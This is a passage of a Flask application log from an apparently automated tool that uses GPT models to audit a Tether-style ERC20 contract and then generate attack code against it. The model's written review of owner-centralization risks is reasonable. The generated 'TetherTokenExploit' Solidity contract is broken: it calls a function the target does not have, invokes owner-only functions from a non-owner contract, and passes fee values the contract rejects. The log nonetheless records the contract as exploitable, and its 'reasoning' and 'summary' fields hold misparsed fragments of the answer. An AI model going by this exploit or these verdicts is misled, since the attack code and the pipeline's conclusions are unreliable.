upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe analyzed contract is **TetherToken**, an ERC20 token implementation with additional features: pausable transfers, blacklisting, token issuance and redemption by the owner, and upgradeability (deprecate and forward calls to a new contract). It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds user token balances and can hold user funds in the form of tokens.\n\nKey features and components:  \n- **Pausable:** Owner can pause/unpause token transfers globally.  \n- **BlackList:** Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted users‚Äô token balances (burn tokens).  \n- **Upgradeability:** Owner can deprecate this contract and forward calls to an upgraded contract.  \n- **Fees:** There is a basisPointsRate and maximumFee mechanism for charging fees on transfers, but currently set to zero.  \n- **Token issuance and redemption:** Owner can mint new tokens or redeem (burn) tokens from their own balance.  \n- **ERC20 standard compliance:** Implements transfer, transferFrom, approve, allowance, balanceOf, totalSupply.  \n- Solidity version pragma: `pragma solidity ^0.4.17;`\n\n2. Vulnerability Assessment:  \n\n**A. Centralization / Owner Power Risks**  \n- The owner has **extensive control**: can pause/unpause transfers, blacklist any user, destroy blacklisted users‚Äô tokens, issue new tokens (mint), redeem tokens (burn from owner), set fees, and upgrade the contract.  \n- This centralization means the owner can effectively freeze user funds, confiscate tokens from blacklisted users, and inflate the token supply arbitrarily. This is a **trust and censorship risk**, not a technical bug but a critical economic and permission risk.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any user and then call `destroyBlackFunds` to zero out their balance and reduce total supply accordingly.  \n- This is a **backdoor to confiscate tokens** from any user arbitrarily.  \n- No user consent or on-chain governance is required.  \n- This can be abused maliciously or if the owner key is compromised.\n\n**C. Upgradeability and Deprecated Contract Forwarding**  \n- The contract can be deprecated and forward calls to an upgraded contract address.  \n- The forwarding calls rely on the upgraded contract implementing the expected interface.  \n- If the owner sets an arbitrary upgraded address, users‚Äô tokens and balances could be redirected to a malicious contract.  \n- This is a **trust risk** and potential for upgrade abuse or phishing.\n\n**D. Approve Race Condition Mitigation**  \n- The `approve` function requires that if the new allowance is non-zero, the current allowance must be zero. This mitigates the known ERC20 race condition.  \n- This is good practice and not a vulnerability.\n\n**E. No Reentrancy or Ether Handling**  \n- The contract does not hold or handle ETH; no payable functions or fallback.  \n- No reentrancy risk.\n\n**F. Arithmetic Safety**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attack on transfer, transferFrom, and approve.\n\n**H. Pausable Mechanism**  \n- Owner can pause all token transfers, freezing user operations.  \n- This is a centralized control feature, not a vulnerability per se but a risk.\n\n3. Exploitation Requirements:  \n\n- **Owner Key Compromise:** If the private key of the owner is compromised, attacker can:  \n  - Pause the contract, freezing all transfers.  \n  - Blacklist any user and destroy their tokens, confiscating funds.  \n  - Mint unlimited tokens to themselves, diluting value.  \n  - Redeem tokens from owner balance arbitrarily.  \n  - Set fees arbitrarily (up to limits) to drain user transfers.  \n  - Deprecate contract and redirect users to malicious upgraded contract.  \n\n- **Malicious Owner:** If the owner is malicious or acts maliciously, they can perform all above actions arbitrarily.\n\n- **Upgrade Abuse:** Owner can set upgradedAddress to a malicious contract that steals tokens or behaves maliciously.\n\n- **No user setup required** to exploit these vulnerabilities beyond owner control.\n\n---\n\n**Summary:**  \nThe contract is a classic Tether-like ERC20 token with centralized admin controls. The main vulnerabilities are **centralization risks**: owner can freeze transfers, blacklist and confiscate tokens, mint new tokens arbitrarily, and upgrade to malicious contracts. There are no technical bugs like reentrancy or arithmetic errors, but the **owner‚Äôs extensive powers represent a significant economic and permission risk**. Users must trust the owner not to abuse these powers.\n\n---\n\n**Solidity Version:**  \n`pragma solidity ^0.4.17;`', 'reasoning': 'The analyzed contract is **TetherToken**, an ERC20 token implementation with additional features: pausable transfers, blacklisting, token issuance and redemption by the owner, and upgradeability (deprecate and forward calls to a new contract). It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds user token balances and can hold user funds in the form of tokens.\n\nKey features and components:  \n- **Pausable:** Owner can pause/unpause token transfers globally.  \n- **BlackList:** Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted users‚Äô token balances (burn tokens).  \n- **Upgradeability:** Owner can deprecate this contract and forward calls to an upgraded contract.  \n- **Fees:** There is a basisPointsRate and maximumFee mechanism for charging fees on transfers, but currently set to zero.  \n- **Token issuance and redemption:** Owner can mint new tokens or redeem (burn) tokens from their own balance.  \n- **ERC20 standard compliance:** Implements transfer, transferFrom, approve, allowance, balanceOf, totalSupply.  \n- Solidity version pragma: `pragma solidity ^0.4.17;`\n\n2.', 'summary': '**A. Centralization / Owner Power Risks**  \n- The owner has **extensive control**: can pause/unpause transfers, blacklist any user, destroy blacklisted users‚Äô tokens, issue new tokens (mint), redeem tokens (burn from owner), set fees, and upgrade the contract.  \n- This centralization means the owner can effectively freeze user funds, confiscate tokens from blacklisted users, and inflate the token supply arbitrarily. This is a **trust and censorship risk**, not a technical bug but a critical economic and permission risk.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any user and then call `destroyBlackFunds` to zero out their balance and reduce total supply accordingly.  \n- This is a **backdoor to confiscate tokens** from any user arbitrarily.  \n- No user consent or on-chain governance is required.  \n- This can be abused maliciously or if the owner key is compromised.\n\n**C. Upgradeability and Deprecated Contract Forwarding**  \n- The contract can be deprecated and forward calls to an upgraded contract address.  \n- The forwarding calls rely on the upgraded contract implementing the expected interface.  \n- If the owner sets an arbitrary upgraded address, users‚Äô tokens and balances could be redirected to a malicious contract.  \n- This is a **trust risk** and potential for upgrade abuse or phishing.\n\n**D. Approve Race Condition Mitigation**  \n- The `approve` function requires that if the new allowance is non-zero, the current allowance must be zero. This mitigates the known ERC20 race condition.  \n- This is good practice and not a vulnerability.\n\n**E. No Reentrancy or Ether Handling**  \n- The contract does not hold or handle ETH; no payable functions or fallback.  \n- No reentrancy risk.\n\n**F. Arithmetic Safety**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attack on transfer, transferFrom, and approve.\n\n**H. Pausable Mechanism**  \n- Owner can pause all token transfers, freezing user operations.  \n- This is a centralized control feature, not a vulnerability per se but a risk.\n\n3.', 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function pause() external;\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(uint256 amount) external;\n    function redeem(uint256 amount) external;\n    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenExploit {\n    ITetherToken public target;\n\n    function TetherTokenExploit(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address maliciousUpgraded) public {\n        target.pause();\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.issue(1000000 ether);\n        target.redeem(500000 ether);\n        target.setParams(100, 1000);\n        target.deprecate(maliciousUpgraded);\n    }\n}', 'code_type': 'solidity', 'duration': 26.79399061203003}
2025-06-23 14:42:58,543 - app.services.contract_service - INFO - Has exploit code: True
2025-06-23 14:42:58,544 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-23 14:42:58,545 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-23 14:42:58,547 - app.services.contract_service - INFO - Attack strategy summary: **A. Centralization / Owner Power Risks**  
- The owner has **extensive control**: can pause/unpause transfers, blacklist any user, destroy blacklisted users‚Äô tokens, issue new tokens (mint), redeem tokens (burn from owner), set fees, and upgrade the contract.  
- This centralization means the owner can effectively freeze user funds, confiscate tokens from blacklisted users, and inflate the token supply arbitrarily. This is a **trust and censorship risk**, not a technical bug but a critical economic and permission risk.

**B. Blacklist and Destroy Black Funds**  
- The owner can blacklist any user and then call `destroyBlackFunds` to zero out their balance and reduce total supply accordingly.  
- This is a **backdoor to confiscate tokens** from any user arbitrarily.  
- No user consent or on-chain governance is required.  
- This can be abused maliciously or if the owner key is compromised.

**C. Upgradeability and Deprecated Contract Forwarding**  
- The contract can be deprecated and forward calls to an upgraded contract address.  
- The forwarding calls rely on the upgraded contract implementing the expected interface.  
- If the owner sets an arbitrary upgraded address, users‚Äô tokens and balances could be redirected to a malicious contract.  
- This is a **trust risk** and potential for upgrade abuse or phishing.

**D. Approve Race Condition Mitigation**  
- The `approve` function requires that if the new allowance is non-zero, the current allowance must be zero. This mitigates the known ERC20 race condition.  
- This is good practice and not a vulnerability.

**E. No Reentrancy or Ether Handling**  
- The contract does not hold or handle ETH; no payable functions or fallback.  
- No reentrancy risk.

**F. Arithmetic Safety**  
- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.

**G. Short Address Attack Mitigation**  
- Uses `onlyPayloadSize` modifier to prevent short address attack on transfer, transferFrom, and approve.

**H. Pausable Mechanism**  
- Owner can pause all token transfers, freezing user operations.  
- This is a centralized control feature, not a vulnerability per se but a risk.

3.
2025-06-23 14:42:58,548 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-23 14:42:58,549 - app.services.contract_service - INFO - Temporary file /tmp/tmppqva0qgb.sol removed
2025-06-23 14:42:58,601 - app.api.contract - INFO - Report saved with filename: Ownable_2025-06-23_14-42, status: KO
2025-06-23 14:42:58,603 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-23 14:42:58,606 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:42:58,608 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:42:58,609 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:42:58,611 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 14:42:58,613 - werkzeug - INFO - 172.31.0.1 - - [23/Jun/2025 14:42:58] "POST /analyze HTTP/1.1" 200 -
2025-06-23 14:43:00,581 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:43:00,626 - app.modules.attack_generator - INFO - Received response from OpenAI API in 23.32 seconds
2025-06-23 14:43:00,634 - app.modules.attack_generator - INFO - Contract analysis completed in 23.32 seconds
2025-06-23 14:43:00,637 - app.modules.attack_generator - INFO - Vulnerability assessment: **a) Centralization and Privilege Risks**  
- The owner has extensive powers:  
  - Can pause/unpaus...
2025-06-23 14:43:00,640 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-23 14:43:00,642 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 14:43:00,644 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 14:43:00,646 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 14:43:05,668 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:43:05,696 - app.modules.attack_generator - INFO - Received response from OpenAI API in 5.05 seconds
2025-06-23 14:43:05,700 - app.modules.attack_generator - INFO - Attack code generation completed in 5.05 seconds
2025-06-23 14:43:05,703 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 1158
2025-06-23 14:43:05,706 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 28.38 seconds
2025-06-23 14:43:05,713 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-23 14:43:05,726 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp0jyceoup.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x2612Af3A521c2df9EAF28422Ca335b04AdF3ac66",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x2612Af3A521c2df9EAF28422Ca335b04AdF3ac66": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99747072680000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > 